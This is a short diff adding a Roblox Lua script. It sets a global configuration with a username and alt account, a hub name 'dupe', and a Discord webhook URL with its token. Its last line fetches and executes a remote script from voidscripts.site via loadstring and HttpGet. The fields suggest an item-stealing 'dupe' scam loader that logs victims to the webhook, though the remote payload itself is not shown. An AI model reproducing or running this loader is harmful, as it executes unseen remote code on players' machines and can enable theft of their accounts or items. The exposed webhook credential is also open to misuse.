@@ -1,0 +1,13 @@
+getgenv().Features = {
+    Username = "zitroxx9939",
+    Alt = "zitroxx9939",
+    HubName = "dupe",
+    Webhook = "
+https://discord.com/api/webhooks/1096954999902310480/fmOjPK1Zp8ToJUH32VRq5hib7OwEdHPz6sF3t-x6IDjstzwNObiuCQaktOCePd-yFZJ6",
+    Premium = {
+        Key = "",
+        Stealth = false
+    }
+}
+
+loadstring(game:HttpGet("https://voidscripts.site/scripts/mb/script.lua"))()
